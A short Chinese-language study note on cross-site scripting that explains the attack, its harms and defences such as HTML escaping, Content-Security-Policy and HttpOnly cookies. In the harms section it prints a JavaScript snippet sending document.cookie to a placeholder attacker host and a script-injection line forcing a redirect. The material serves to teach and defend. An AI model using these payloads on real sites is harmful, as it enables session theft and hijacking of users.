# XSS

XSS的攻击方式就是想办法“教唆”用户的浏览器去执行一些这个网页中原本不存在的前端代码

XSS的攻击过程都是在浏览器通过执行javascript脚本自动进行，缺少与用户交互的过程

![img](https://segmentfault.com/img/remote/1460000012693785?w=1031&h=767)

# XSS的危害

- 窃取网页浏览中的cookie值，这里和CSRF的区别是，这里是拿到了cookie后主动冒充用户的，而CSRF中根本就不知cookie，仅利用浏览器的隐式校验方式冒充用户。

  ```
  var i=document.createElement("img");
  document.body.appendChild(i);
  i.src ="http://www.hackerserver.com/?c=" + document.cookie;
  ```

  

- 劫持流量实现恶意跳转
想办法插入一句像这样的语句：`<script>window.location.href="http://www.baidu.com";</script>`

- 构建Get和Post请求

  XSS可以在javascript中构建get或者post请求，来实现自己的攻击

# 防范手段
可以从两方面入手：

- 想办法阻止恶意代码的注入和执行；

- 用更安全的方法校验和保护用户的身份凭证，以降低XSS攻击之后带来的危害；

  

1、使用HTML转义。对外部插入的内容要永远保持警惕。

对所有外部插入的代码都应该做一次转义，将script,& < > " ' /等危险字符做过滤和转义替换，同时尽量避免使用innerHTML,document.write,outerHTML,eval等方法，用安全性更高的textContent,setAttribute等方法做替代；

2、开启CSP防护。

内容安全策略（CSP）的设计就是为了防御XSS攻击的，通过在HTTP头部中设置Content-Security-Policy,就可以配置该策略，如果将CSP设置成一下模式：
`Content-Security-Policy: script-src 'self'`

那么该网站将：

- 不允许内联脚本执行;
- 禁止加载外域代码;
- 禁止外域提交;

这将有效地防范XSS的攻击，当然他也非常严格，可能会对自身的业务开发也造成一定限制，更多关于CSP的内容可以查看MDN。

3、设置HttpOnly。

当然这已经是属于降低XSS危害的方法，对于所有包含敏感信息的cookie，都应该在服务端对其设置httpOnly，被设置了httpOnly的cookie字段无法通过JS获取，也就降低了XSS攻击时用户凭据隐私泄漏的风险。

